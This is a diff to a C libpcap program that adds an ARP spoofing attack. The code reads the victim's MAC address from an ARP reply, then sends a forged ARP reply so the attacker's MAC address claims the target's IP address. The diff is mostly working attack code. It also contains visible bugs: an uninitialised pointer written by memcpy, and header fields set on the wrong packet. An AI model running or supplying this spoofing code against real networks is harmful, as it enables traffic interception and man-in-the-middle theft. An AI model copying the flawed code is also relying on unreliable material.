@@ -32,6 +32,12 @@ int main(int argc, char *argv[])
     char packet[60];
     struct ether_header *ethh;
     struct ETHER_ARP *arph;
+    int res;
+    struct pcap_pkthdr *header;
+    const u_char *get_packet;
+    struct ETHER_ARP *get_arp;
+    unsigned char *sender_mac;
+    char spoofing_packet[60];
 
     if(argc<4)
     {
@@ -130,6 +136,58 @@ int main(int argc, char *argv[])
     /* Send ARP Packet */
     pcap_sendpacket(handle, packet, 42);
     printf("Success Send ARP Request!\n");
+
+    /* Get ARP Reply Packet */
+    while(1){
+        res = pcap_next_ex(handle, &header, &get_packet);
+        if(res < 1){
+            continue;
+        }
+
+        ethh = (struct ether_header *)get_packet;
+        if(ethh->ether_type != ntohs(ETHERTYPE_ARP)){
+            continue;
+        }
+
+        get_arp = (struct ETHER_ARP *)(get_packet+14);
+        if(get_arp->ea_hdr.ar_pro == ntohs(ETHERTYPE_IP) && get_arp->ea_hdr.ar_op == 2){
+            if(get_arp->arp_spa == arph->arp_tpa){
+                memcpy(sender_mac, get_arp->arp_sha, 6);
+                printf("Sender MAC address : ");
+                for(int i=0; i<5; i++){
+                    printf("%02x:", sender_mac[i]);
+                }
+                printf("%02x\n", sender_mac[5]);
+                printf("Success ARP Reply\n");
+                break;
+            }
+        }
+    }
+
+    /* ARP Spoofing */
+    ethh = (struct ether_header *)spoofing_packet;
+    for(int i=0; i<6; i++){
+        ethh->ether_dhost[i] = sender_mac[i];
+    }
+    for(int i=0; i<6; i++){
+        ethh->ether_shost[i] = attacker_mac[i];
+    }
+    ethh->ether_type = ntohs(ETHERTYPE_ARP);
+    arph->arp_spa = target_ip;
+    arph->arp_tpa = sender_ip;
+
+    arph = (struct ETHER_ARP *)(spoofing_packet+14);
+    arph->ea_hdr.ar_hrd = ntohs(ARPHRD_ETHER);
+    arph->ea_hdr.ar_pro = ntohs(ETHERTYPE_IP);
+    arph->ea_hdr.ar_hln = 6;
+    arph->ea_hdr.ar_pln = 4;
+    arph->ea_hdr.ar_op = ntohs(ARPOP_REPLY);
+    memcpy(arph->arp_sha, attacker_mac, 6);
+    arph->arp_spa = target_ip;
+    memcpy(arph->arp_tha, sender_mac, 6);
+    arph->arp_tpa = sender_ip;
+
+    pcap_sendpacket(handle, spoofing_packet, 42);
 
     /* Close pcap */
     pcap_close(handle);
